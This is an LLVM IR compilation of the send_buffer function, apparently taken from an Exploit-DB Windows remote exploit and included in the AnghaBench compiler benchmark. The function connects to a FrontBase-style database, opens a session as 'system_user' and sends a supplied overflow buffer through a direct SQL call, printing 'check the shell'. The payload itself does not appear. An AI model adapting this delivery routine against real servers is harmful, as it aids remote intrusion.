; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_3650.c_send_buffer.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_3650.c_send_buffer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.send_buffer.sesn = private unnamed_addr constant [13 x i8] c"dreatica-fxp\00", align 1
@.str = private unnamed_addr constant [25 x i8] c"[+] Connecting to %s:%d\0A\00", align 1
@.str.1 = private unnamed_addr constant [37 x i8] c"[+] Connecting to %s to database %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"[-] Cannot connect to %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"system_user\00", align 1
@.str.4 = private unnamed_addr constant [30 x i8] c"[-] Failed to create session\0A\00", align 1
@.str.5 = private unnamed_addr constant [59 x i8] c"[+] Sending %d bytes of buffer to server, check the shell\0A\00", align 1
@.str.6 = private unnamed_addr constant [27 x i8] c"[-] Failed to send buffer\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @send_buffer(i8* %0, i32 %1, i8* %2, i8* %3, i8* %4, i8* %5, i8* %6) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32*, align 8
  %17 = alloca i32*, align 8
  %18 = alloca [13 x i8], align 1
  %19 = alloca i8*, align 8
  %20 = alloca i32*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32*, align 8
  %23 = alloca i8*, align 8
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i8* %2, i8** %11, align 8
  store i8* %3, i8** %12, align 8
  store i8* %4, i8** %13, align 8
  store i8* %5, i8** %14, align 8
  store i8* %6, i8** %15, align 8
  %24 = bitcast [13 x i8]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %24, i8* align 1 getelementptr inbounds ([13 x i8], [13 x i8]* @__const.send_buffer.sesn, i32 0, i32 0), i64 13, i1 false)
  %25 = load i8*, i8** %14, align 8
  %26 = icmp ne i8* %25, null
  br i1 %26, label %27, label %28

27:                                               ; preds = %7
  store i32 -1, i32* %10, align 4
  br label %28

28:                                               ; preds = %27, %7
  %29 = call i32 (...) @fbcInitialize()
  %30 = load i32, i32* %10, align 4
  %31 = icmp ne i32 %30, -1
  br i1 %31, label %32, label %40

32:                                               ; preds = %28
  %33 = load i8*, i8** %9, align 8
  %34 = load i32, i32* %10, align 4
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i8* %33, i32 %34)
  %36 = load i8*, i8** %9, align 8
  %37 = load i32, i32* %10, align 4
  %38 = load i8*, i8** %13, align 8
  %39 = call i32* @fbcdcConnectToDatabaseUsingPort(i8* %36, i32 %37, i8* %38)
  store i32* %39, i32** %16, align 8
  br label %48

40:                                               ; preds = %28
  %41 = load i8*, i8** %9, align 8
  %42 = load i8*, i8** %14, align 8
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0), i8* %41, i8* %42)
  %44 = load i8*, i8** %14, align 8
  %45 = load i8*, i8** %9, align 8
  %46 = load i8*, i8** %13, align 8
  %47 = call i32* @fbcdcConnectToDatabase(i8* %44, i8* %45, i8* %46)
  store i32* %47, i32** %16, align 8
  br label %48

48:                                               ; preds = %40, %32
  %49 = load i32*, i32** %16, align 8
  %50 = icmp eq i32* %49, null
  br i1 %50, label %51, label %54

51:                                               ; preds = %48
  %52 = load i8*, i8** %9, align 8
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i8* %52)
  store i32 -1, i32* %8, align 4
  br label %113

54:                                               ; preds = %48
  %55 = getelementptr inbounds [13 x i8], [13 x i8]* %18, i64 0, i64 0
  store i8* %55, i8** %19, align 8
  %56 = load i32*, i32** %16, align 8
  %57 = load i8*, i8** %19, align 8
  %58 = load i8*, i8** %11, align 8
  %59 = load i8*, i8** %12, align 8
  %60 = call i32* @fbcdcCreateSession(i32* %56, i8* %57, i8* %58, i8* %59, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  store i32* %60, i32** %17, align 8
  %61 = load i32*, i32** %17, align 8
  %62 = call i64 @fbcmdErrorsFound(i32* %61)
  %63 = icmp ne i64 %62, 0
  br i1 %63, label %64, label %81

64:                                               ; preds = %54
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0))
  %66 = load i32*, i32** %16, align 8
  %67 = load i32*, i32** %17, align 8
  %68 = call i32* @fbcdcErrorMetaData(i32* %66, i32* %67)
  store i32* %68, i32** %20, align 8
  %69 = load i32*, i32** %20, align 8
  %70 = call i8* @fbcemdAllErrorMessages(i32* %69)
  store i8* %70, i8** %21, align 8
  %71 = load i32*, i32** %20, align 8
  %72 = call i32 @fbcemdRelease(i32* %71)
  %73 = load i8*, i8** %21, align 8
  %74 = call i32 @free(i8* %73)
  %75 = load i32*, i32** %17, align 8
  %76 = call i32 @fbcmdRelease(i32* %75)
  %77 = load i32*, i32** %16, align 8
  %78 = call i32 @fbcdcClose(i32* %77)
  %79 = load i32*, i32** %16, align 8
  %80 = call i32 @fbcdcRelease(i32* %79)
  store i32 -1, i32* %8, align 4
  br label %113

81:                                               ; preds = %54
  %82 = load i32*, i32** %17, align 8
  %83 = call i32 @fbcmdRelease(i32* %82)
  %84 = load i8*, i8** %15, align 8
  %85 = call i32 @strlen(i8* %84)
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.5, i64 0, i64 0), i32 %85)
  %87 = load i32*, i32** %16, align 8
  %88 = load i8*, i8** %15, align 8
  %89 = call i32* @fbcdcExecuteDirectSQL(i32* %87, i8* %88)
  store i32* %89, i32** %17, align 8
  %90 = load i32*, i32** %17, align 8
  %91 = call i64 @fbcmdErrorsFound(i32* %90)
  %92 = icmp ne i64 %91, 0
  br i1 %92, label %93, label %110

93:                                               ; preds = %81
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0))
  %95 = load i32*, i32** %16, align 8
  %96 = load i32*, i32** %17, align 8
  %97 = call i32* @fbcdcErrorMetaData(i32* %95, i32* %96)
  store i32* %97, i32** %22, align 8
  %98 = load i32*, i32** %22, align 8
  %99 = call i8* @fbcemdAllErrorMessages(i32* %98)
  store i8* %99, i8** %23, align 8
  %100 = load i32*, i32** %22, align 8
  %101 = call i32 @fbcemdRelease(i32* %100)
  %102 = load i8*, i8** %23, align 8
  %103 = call i32 @free(i8* %102)
  %104 = load i32*, i32** %17, align 8
  %105 = call i32 @fbcmdRelease(i32* %104)
  %106 = load i32*, i32** %16, align 8
  %107 = call i32 @fbcdcClose(i32* %106)
  %108 = load i32*, i32** %16, align 8
  %109 = call i32 @fbcdcRelease(i32* %108)
  store i32 -1, i32* %8, align 4
  br label %113

110:                                              ; preds = %81
  %111 = load i32*, i32** %17, align 8
  %112 = call i32 @fbcmdRelease(i32* %111)
  store i32 1, i32* %8, align 4
  br label %113

113:                                              ; preds = %110, %93, %64, %51
  %114 = load i32, i32* %8, align 4
  ret i32 %114
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @fbcInitialize(...) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32* @fbcdcConnectToDatabaseUsingPort(i8*, i32, i8*) #2

declare dso_local i32* @fbcdcConnectToDatabase(i8*, i8*, i8*) #2

declare dso_local i32* @fbcdcCreateSession(i32*, i8*, i8*, i8*, i8*) #2

declare dso_local i64 @fbcmdErrorsFound(i32*) #2

declare dso_local i32* @fbcdcErrorMetaData(i32*, i32*) #2

declare dso_local i8* @fbcemdAllErrorMessages(i32*) #2

declare dso_local i32 @fbcemdRelease(i32*) #2

declare dso_local i32 @free(i8*) #2

declare dso_local i32 @fbcmdRelease(i32*) #2

declare dso_local i32 @fbcdcClose(i32*) #2

declare dso_local i32 @fbcdcRelease(i32*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32* @fbcdcExecuteDirectSQL(i32*, i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
